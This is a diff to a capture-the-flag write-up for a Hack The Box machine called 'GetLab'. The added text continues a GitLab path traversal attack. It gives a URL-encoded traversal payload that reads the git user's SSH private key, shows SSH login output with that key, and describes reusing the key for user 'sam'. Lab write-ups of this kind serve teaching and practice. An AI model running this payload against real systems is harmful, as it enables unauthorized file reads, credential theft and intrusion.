@@ -1,4 +1,4 @@
-# Writeup
+# GetLab
 
 # Enumeration
 ---
@@ -91,4 +91,32 @@ This traverses to the base directory and accesses /etc/passwd:
 
 ![image](https://github.com/user-attachments/assets/02fad883-6a92-4b18-958f-3d16d518b900)
 
-We can now use this 
+We can now seemingly access any area of the file system, and have knowlege of users and their home directories from the /etc/passwd file. Adjusting the payload we can look for SSH private keys. The new payload, using the home directory of the git user taken from the /etc/passwd file is:
+
+```text
+/group-1/group-2/group-3/group-4/group-5/group-6/group-7/group-8/group-9/group-10/group-11/project-2/uploads/b5b4ddeeccb3365ce8ca8b9fa5b31900/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fopt%2Fgitlab%2F.ssh%2Fid_rsa
+```
+
+![image](https://github.com/user-attachments/assets/a0de23b7-27a8-4af7-97e8-aa1f36d4abaf)
+
+We can now save this on our attack machine and use ssh to connect to the target using the git user. 
+
+```bash
+┌──(kali㉿kali)-[~/Documents/HTB/getbash/ssh-key]
+└─$ ssh -i id_rsa git@10.129.229.69
+Linux getlab 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Dec 17 09:26:58 2024 from 10.10.14.5
+$ id
+uid=997(git) gid=997(git) groups=997(git)
+```
+
+Unfortunately we do not have permission to access the flag with the git user, after trying a few things I tried the same ssh key with the only non-system user on the machine 'sam'. They key works and I was able to access the flag, proof below:
+
+![image](https://github.com/user-attachments/assets/6eecf516-923d-42be-aa80-2819bdb7e3b6)
